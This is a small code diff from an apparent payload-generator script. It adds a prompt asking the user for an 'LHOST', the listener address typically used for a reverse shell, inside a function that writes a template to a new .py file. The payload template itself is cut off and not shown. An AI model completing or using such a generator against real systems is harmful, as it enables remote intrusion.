@@ -2,6 +2,7 @@
 
 def pyload():
     print("[*] Insert a file name.py")
+    ip = input("[!] Select Your LHOST: ")
     arq = open(file_name, 'w')
     finish()
     temp = """
